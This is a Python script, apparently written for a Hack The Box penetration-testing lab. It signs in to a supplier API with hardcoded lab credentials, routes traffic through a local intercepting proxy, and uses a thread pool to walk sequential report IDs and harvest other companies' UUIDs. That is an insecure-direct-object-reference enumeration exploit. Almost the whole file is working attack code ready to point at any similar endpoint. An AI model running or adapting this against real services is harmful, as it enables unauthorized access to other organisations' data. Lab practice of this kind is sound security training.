import requests
import logging
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Setup logging so you don't just rely on 'print'
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

class SupplierScraper:
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
        self.scraped_uuids = set()
        self.uuid_lock = Lock()

    def authenticate(self, email, password):
        """Standardizes auth and updates session headers."""
        url = f"{self.base_url}/api/v1/authentication/suppliers/sign-in"
        payload = {"Email": email, "Password": password}
        
        try:
            resp = self.session.post(url, json=payload)
            resp.raise_for_status() # Check for 4xx/5xx errors
            jwt = resp.json().get('jwt')
            self.session.headers.update({'Authorization': f'Bearer {jwt}', 'Accept': 'application/json'})
            logging.info("Authentication successful.")
        except Exception as e:
            logging.error(f"Auth failed: {e}")
            return False
        return True

    def get_report(self, report_id):
        """Single point of failure handling for report fetching."""
        url = f"{self.base_url}/api/v1/supplier-companies/yearly-reports/{report_id}"
        try:
            resp = self.session.get(url)
            if resp.status_code == 200:
                return resp.json()
            return None
        except Exception:
            return None

    def scrape_worker(self, report_id):
        """The logic for a single thread."""
        data = self.get_report(report_id)
        if data and 'supplierCompanyYearlyReport' in data:
            uuid = data['supplierCompanyYearlyReport']['companyID']
            with self.uuid_lock:
                self.scraped_uuids.add(uuid)
            logging.info(f"ID {report_id}: Found UUID {uuid}")

    def run_discovery(self, start_id, end_id, workers=10):
        logging.info(f"Starting scrape from ID {start_id} to {end_id}...")
        with ThreadPoolExecutor(max_workers=workers) as executor:
            executor.map(self.scrape_worker, range(start_id, end_id))

if __name__ == "__main__":
    # CONFIGURATION
    TARGET = "http://154.57.164.79:30278"
    PROXY = "http://127.0.0.1:8080"
    
    scraper = SupplierScraper(TARGET, proxy=PROXY)
    
    if scraper.authenticate("htbpentester2@pentestercompany.com", "HTBPentester2"):
        scraper.run_discovery(0, 50)
        
        # Save results
        with open("output/1_gemini_scraped_uuids.txt", "w") as f:
            f.write("\n".join(scraper.scraped_uuids))
        logging.info(f"Done. Saved {len(scraper.scraped_uuids)} unique UUIDs.")